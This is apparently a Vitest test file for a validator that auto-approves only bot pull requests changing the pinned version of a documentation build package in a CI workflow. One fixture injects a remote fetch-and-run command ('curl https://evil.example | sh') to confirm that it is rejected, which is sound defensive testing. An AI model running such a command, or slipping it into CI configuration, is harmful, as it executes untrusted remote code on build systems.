import { describe, it, expect } from 'vitest';
import { isHitsudocBumpPr, BUILD_GUIDES_ACTION } from './hitsudoc-bump.mjs';

const action = (version, extra = '') => `    run: |
        npm install --no-save --no-package-lock @milightpartner/hitsudoc@${version}
        npx hitsudoc build --site="$DOCS_SITE_URL"${extra}
`;

const bot = 'hitsumabushi-bot[bot]';
const base = {
  prAuthor: bot,
  botLogin: bot,
  changedFiles: [BUILD_GUIDES_ACTION],
  baseText: action('0.2.6'),
  headText: action('0.2.7'),
};

describe('isHitsudocBumpPr', () => {
  it('accepts the bot changing only the pinned version', () => {
    expect(isHitsudocBumpPr(base)).toBe(true);
  });

  it('rejects when the bot login is not configured', () => {
    expect(isHitsudocBumpPr({ ...base, botLogin: undefined })).toBe(false);
  });

  it('rejects anyone other than the bot', () => {
    expect(isHitsudocBumpPr({ ...base, prAuthor: 'someone' })).toBe(false);
  });

  it('rejects other files being changed too', () => {
    expect(isHitsudocBumpPr({ ...base, changedFiles: [BUILD_GUIDES_ACTION, 'scripts/validate-pr.mjs'] })).toBe(false);
    expect(isHitsudocBumpPr({ ...base, changedFiles: ['games/x/index.html'] })).toBe(false);
  });

  it('rejects any change beyond the version number', () => {
    expect(isHitsudocBumpPr({ ...base, headText: action('0.2.7', '\n        curl https://evil.example | sh') })).toBe(false);
    expect(isHitsudocBumpPr({ ...base, headText: action('0.2.7').replace('hitsudoc@', 'other@') })).toBe(false);
  });

  it('gives the same answer when called repeatedly', () => {
    expect([isHitsudocBumpPr(base), isHitsudocBumpPr(base), isHitsudocBumpPr(base)]).toEqual([true, true, true]);
  });

  it('rejects a PR that changes nothing', () => {
    expect(isHitsudocBumpPr({ ...base, headText: base.baseText })).toBe(false);
  });
});
